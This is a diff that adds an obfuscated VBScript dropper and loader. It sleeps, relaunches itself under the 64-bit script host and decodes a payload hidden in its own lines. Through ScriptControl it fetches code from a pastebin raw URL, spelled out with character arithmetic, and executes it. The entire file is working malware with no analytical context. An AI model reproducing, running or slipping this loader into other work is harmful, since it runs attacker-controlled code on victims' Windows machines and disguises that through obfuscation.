@@ -1,0 +1,72 @@
+﻿wscript.sleep(10000)
+dim KWteaHafFeaq,JHgfeomgLpfMj:ZZFJFG58GJ55H85U5:dim kiolmp:kiolmp = chr(101):dhgprdt():i = 10 + 120 - 130:SDRertserfty = chr(10+10+10+9)
+Function chr(MYURTHFYTR6YFH6RYHF)
+Dim Z7UR7UFHEFRURGHRYHGYR
+dim SDRRFGTYHGFGFGf
+Z7UR7UFHEFRURGHRYHGYR = chr(MYURTHFYTR6YFH6RYHF)
+for i = 1000 - 999 to len(Z7UR7UFHEFRURGHRYHGYR)
+SDRRFGTYHGFGFGf = chr(asc(Z7UR7UFHEFRURGHRYHGYR))
+next
+W = SDRRFGTYHGFGFGf
+end Function
+function OPLMITJGUCN57 (OLGTUR783J4H6UR,NHGUIRTNVUTI65,KIOYKGJUTH6785HT)
+OPLMITJGUCN57 = Replace(OLGTUR783J4H6UR,NHGUIRTNVUTI65,KIOYKGJUTH6785HT)
+end function
+function A (OLKGIUTJ7685JFJU8TK())
+DIM O90RU47BFGTEYURHFBYYT
+for i = 20 + 20 - 40 TO UBound(OLKGIUTJ7685JFJU8TK)
+O90RU47BFGTEYURHFBYYT  = O90RU47BFGTEYURHFBYYT + chr(OLKGIUTJ7685JFJU8TK(i))
+A = O90RU47BFGTEYURHFBYYT 
+next
+end function
+sub naffid(val):Set ADFG = CreateObject(chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & "trol"):ADFG.Language = chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) &"pt":ADFG.addobject chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) &"t",WScript:ADFG.Timeout= -1:ADFG.Addcode(val):end sub
+do until i = ubound(KWteaHafFeaq)
+if instr(OPLMITJGUCN57(KWteaHafFeaq(i),SDRertserfty,""),"lbjlxiabtd") then KWteaHafFeaq(i) = OPLMITJGUCN57(KWteaHafFeaq(i),"lbjlxiabtd",""):Exit Do
+JHgfeomgLpfMj = JHgfeomgLpfMj & StrReverse(OPLMITJGUCN57(KWteaHafFeaq(i),SDRertserfty,""))
+i = i + 1
+loop
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,chr( ( (1* 2^3))),"1")
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,"","2")
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,chr( ((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3))),"3")
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,"","4")
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,chr( ( (1* 2^4))),"5")
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,chr( ( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3))),"6")
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,"","7")
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,"","8")
+JHgfeomgLpfMj = OPLMITJGUCN57 (JHgfeomgLpfMj,"","9")
+Dim Inagsapwnyamta
+set Inagsapwnyamta = WScript.CreateObject("Scri"& chr( (  (1* 2^4 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6))) &"Control")
+Inagsapwnyamta.Language = EiaEsaucikagwtAQ("VBS"& chr( ((1* 2^0 )+ (1* 2^1 )+ (1* 2^5 )+ (1* 2^6))) &"ript")
+Inagsapwnyamta.addobject "WSc"& chr( ( (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6))) &"ipt",WScript
+Inagsapwnyamta.TimeOut = -1
+Inagsapwnyamta.Addcode(EiaEsaucikagwtAQ(chr( (  (1* 2^2 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6))) & chr( ((1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)))&" R"& chr( ((1* 2^0 )+ (1* 2^5 )+ (1* 2^6))) &"kan , x"))
+Inagsapwnyamta.Addcode(EiaEsaucikagwtAQ("x = ") & EiaEsaucikagwtAQ("Split(") & EiaEsaucikagwtAQ("""") & JHgfeomgLpfMj & EiaEsaucikagwtAQ("""") & EiaEsaucikagwtAQ(", ") & EiaEsaucikagwtAQ("""") & EiaEsaucikagwtAQ("") & EiaEsaucikagwtAQ("""") & EiaEsaucikagwtAQ("):i = 0"))
+Inagsapwnyamta.Addcode(chr( (  (1* 2^2 )+ (1* 2^5 )+ (1* 2^6))) & chr( ((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)))&" until i = ubo"& chr( ( (1* 2^0 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6))) &"d(x):w = w & chr(x(i)):i = i + 1:loop")
+Inagsapwnyamta.Addcode(chr( ( (1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)))&" M = Creat"& chr( ((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6))) &"Object(" & chr(34) & "Script"& chr( ((1* 2^0 )+ (1* 2^1 )+ (1* 2^6))) &"ontrol" & chr(34) & ")")
+Inagsapwnyamta.AddCode(chr( ( (1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6))) & chr( (  (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5))) & chr( (  (1* 2^2 )+ (1* 2^3 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^5 )+ (1* 2^6))) & chr( (  (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^5 )+ (1* 2^6))) & chr( ((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)))&"e = " & """" & "VBScript" & """")
+Inagsapwnyamta.addcode(chr( ( (1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6))) & chr( (  (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5))) & chr( ( (1* 2^0 )+ (1* 2^6))) & chr( (  (1* 2^2 )+ (1* 2^5 )+ (1* 2^6))) & chr( (  (1* 2^2 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6))) & chr( ( (1* 2^1 )+ (1* 2^5 )+ (1* 2^6)))&"j"& kiolmp &"ct " & """" & "WS"& chr( ((1* 2^0 )+ (1* 2^1 )+ (1* 2^6))) &"ript" & """" & chr( (  (1* 2^2 )+ (1* 2^3 )+ (1* 2^5))) & chr( ( (1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^1 )+ (1* 2^6))) & chr( (  (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6))) & chr( (  (1* 2^4 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6))))
+Inagsapwnyamta.addcode(chr( ( (1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6))) & chr( (  (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5))) & chr( (  (1* 2^2 )+ (1* 2^4 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6))) & chr( ( (1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6))) & chr( ((1* 2^0 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)))&"t = -1")
+Inagsapwnyamta.AddCode(chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr((1* 2^0 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^3 )+ (1* 2^5)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^3 )+ (1* 2^5)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5))):naffid(wsript)
+sub dhgprdt
+KWteaHafFeaq = Split(KWteaHafFeaq0(wscript.scriptfullname),vbCrLf)
+end sub
+function wsript():Dim document :Set document = WScript.GetObject(chr( (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^3 )+ (1* 2^4 )+ (1* 2^5)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr( (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr( (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^3 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^4 )+ (1* 2^5)) & chr( (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^4 )+ (1* 2^5))):While document.readystate <> chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & "e" :WScript.Sleep 2 :Wend :se =document.documentelement.outerhtml:se = Replace(se,"<" & chr( (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^4 )+ (1* 2^5)) & chr( (1* 2^2 )+ (1* 2^3 )+ (1* 2^4 )+ (1* 2^5)) & chr( (1* 2^3 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^6)) & ">",""):se = Replace(se,"<"& chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr( (1* 2^3 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^6)) &">",""):se = Replace(se,"<" & chr( (1* 2^1 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^4 )+ (1* 2^6)) & ">",""):se = Replace(se,"<" & chr( (1* 2^4 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^6)) & ">",""):se = Replace(se,"</PRE><" & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr( (1* 2^1 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^4 )+ (1* 2^6)) &"></HTML>",""):wsript = se:end function
+Function EiaEsaucikagwtAQ(ByVal AiajsatiPCatMfcne) EiaEsaucikagwtAQ = AiajsatiPCatMfcne:End Function
+Function KWteaHafFeaq0(KWteaHafFeaq1):KWteaHafFeaq0= CreateObject("Script"& chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) &"Object").OpenTextFile(KWteaHafFeaq1, 1).Readall:End Function
+SUB ZZFJFG58GJ55H85U5()
+Dim ScriptHost : ScriptHost = Mid(WScript.FullName, InStrRev(WScript.FullName, "\") + 1, Len(WScript.FullName))
+Dim oWs : Set oWs = CreateObject("WS"& chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr( (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) &"ell")
+Dim oProcEnv : Set oProcEnv = oWs.Environment("Process")
+If InStr(LCase(WScript.FullName), LCase(oProcEnv("wi"& chr( (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^5 )+ (1* 2^6)) & chr( (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) &"ir") & "\System32\")) And oProcEnv("PROCES"& chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^6)) & chr( (1* 2^1 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^6)) & chr( (1* 2^3 )+ (1* 2^6)) &"ITECTURE") = "AMD64" Then
+If Not WScript.Arguments.Count = 0 Then
+Dim sArg, Arg
+sArg = ""
+For Each Arg In Wscript.Arguments
+sArg = sArg & " " & """" & Arg & """"
+Next
+End If
+Dim sCmd : sCmd = """" &  oProcEnv("win"& chr( (1* 2^2 )+ (1* 2^5 )+ (1* 2^6)) &"ir") & "\Sy"& chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^4 )+ (1* 2^5 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^3 )+ (1* 2^6)) & chr((1* 2^0 )+ (1* 2^1 )+ (1* 2^2 )+ (1* 2^4 )+ (1* 2^6)) &"64\" & ScriptHost & """" & " """ & WScript.ScriptFullName & """" & sArg
+oWs.Run sCmd
+WScript.Quit
+End If
+end sub
